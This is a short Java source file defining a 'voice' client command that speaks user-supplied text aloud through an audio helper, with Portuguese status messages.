package br.com.introcdc.connect.client.commands.message;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 17:42
 */

import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.AudioComponents;

public class ClientCommandVoice extends ClientCommand {

    public ClientCommandVoice() {
        super("voice");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (input.isEmpty()) {
            msg("Digite um texto para reproduzir no cliente!");
            return;
        }
        msg("Reproduzindo texto: " + input);
        AudioComponents.playText(input);
    }

}
